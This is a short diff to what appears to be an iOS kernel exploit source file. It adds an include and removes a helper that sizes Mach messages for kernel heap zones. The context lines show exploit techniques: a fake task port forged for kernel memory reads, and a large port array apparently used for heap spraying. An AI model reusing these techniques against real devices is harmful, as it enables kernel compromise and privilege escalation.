@@ -15,7 +15,7 @@
 #include "offsets.h"
 #include "kmem.h"
 #include <common.h>
-
+#include "kutils.h"
 
 static void increase_limits() {
     struct rlimit lim = {0};
@@ -79,11 +79,6 @@ static void build_fake_task_port(uint8_t* fake_port, uint64_t fake_port_kaddr, u
     // set the bsd_info pointer to be 0x10 bytes before the desired initial read:
     *(uint64_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO)) = initial_read_addr - 0x10;
 }
-
-static int message_size_for_kalloc_size(int kalloc_size) {
-    return ((3*kalloc_size)/4) - 0x74;
-}
-
 
 #define N_EARLY_PORTS 80000
 mach_port_t early_ports[N_EARLY_PORTS+20000];
